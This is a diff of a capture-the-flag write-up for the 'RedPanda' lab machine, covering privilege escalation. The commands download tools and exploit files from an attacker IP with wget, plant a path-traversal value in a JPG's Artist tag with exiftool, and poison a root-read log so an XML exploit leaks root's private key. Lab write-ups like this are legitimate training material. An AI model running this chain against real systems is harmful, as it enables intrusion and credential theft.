@@ -78,14 +78,14 @@ In the server yay! Pass for user Woodenk is found under the directory:<br>
 ## System Own:
 <h3>Privilege Escalation</h3>
 We run pspy64(snoop unpriviledged Linux processes) to observe. We notice a JAR file is being executed by root within a time interval.<br>
-woodenk@redpanda:/home/woodenk$ `cd /tmp`<br>
-woodenk@redpanda:/tmp$ `wget 10.10.16.9/pspy64` (Chnage the ip with your localhost)<br>
-woodenk@redpanda:/tmp$ `chmod +x ./pspy64`<br>
-woodenk@redpanda:/tmp$ `./pspy64`<br>
+**woodenk@redpanda:/home/woodenk$** `cd /tmp`<br>
+**woodenk@redpanda:/tmp$** `wget 10.10.16.9/pspy64` (Change the ip with your localhost)<br>
+**woodenk@redpanda:/tmp$** `chmod +x ./pspy64`<br>
+**woodenk@redpanda:/tmp$** `./pspy64`<br>
 
 ![image-25](https://user-images.githubusercontent.com/31168741/204232264-1a76f509-48c9-4f65-bdb2-23c479653fcd.png)
 
-We host an HTTP server at port 8000 in /opt/credit-score/LogParser/final/target/ and download the file. Opening the JAR file using jd-gui, it appears that /opt/panda_search/redpanda.log is being read in main().
+We host an HTTP server at port 8000 in /opt/credit-score/LogParser/final/target/ and download the file. Opening the JAR file using jd-gui, it appears that **/opt/panda_search/redpanda.log** is being read in main().
 
 ![image-26](https://user-images.githubusercontent.com/31168741/204232850-b2bd1377-acd0-4ff0-881f-7aa4fbcac886.png)
 
@@ -100,7 +100,7 @@ According to the code, there are a few conditions to pass:<br>
 <h3>Create a JPG file and add the author's name</h3>
 • Since the current user does not have WRITE access to /credits, we set the “Artist” value to “../tmp/gg” where our XML exploit will be at /tmp/gg_credits.xml.
 • JPG file should be in a folder where the current user has WRITE access. I used /tmp.
-• Use ExifTool to add the Artist tag with the value “../tmp/gg”: `$exiftool -Artist="../tmp/gg" pe_exploit.jpg`
+• Use ExifTool to add the Artist tag with the value “../tmp/gg”: `$exiftool -Artist="../tmp/gg" pe_exploit.jpg`<br>
 
 ![image](https://user-images.githubusercontent.com/31168741/204234748-65bf3ada-8707-4045-a606-67e107200337.png)
 
@@ -110,9 +110,9 @@ According to the code, there are a few conditions to pass:<br>
 ![image](https://user-images.githubusercontent.com/31168741/204234971-ce3ad4c7-8022-4468-8b28-0330e23ae26a.png)
 
 •	We transfer both files in the target machine and modify the log file:<br>
-woodenk@redpanda:/tmp$ `wget 10.10.16.9/pe_exploit.jpg -P /tmp`<br>
-woodenk@redpanda:/tmp$ `wget 10.10.16.9/gg_creds.xml -P /tmp`<br>
-woodenk@redpanda:/tmp$ `echo "222||a||a||/../../../../../../tmp/pe_exploit.jpg" > /opt/panda_search/redpanda.log`<br>
+**woodenk@redpanda:/tmp$** `wget 10.10.16.9/pe_exploit.jpg -P /tmp`<br>
+**woodenk@redpanda:/tmp$** `wget 10.10.16.9/gg_creds.xml -P /tmp`<br>
+**woodenk@redpanda:/tmp$** `echo "222||a||a||/../../../../../../tmp/pe_exploit.jpg" > /opt/panda_search/redpanda.log`<br>
 
 •	Wait for a few minutes and read gg_creds.xml. We should see foo’s value is now replaced with root’s private key.
 
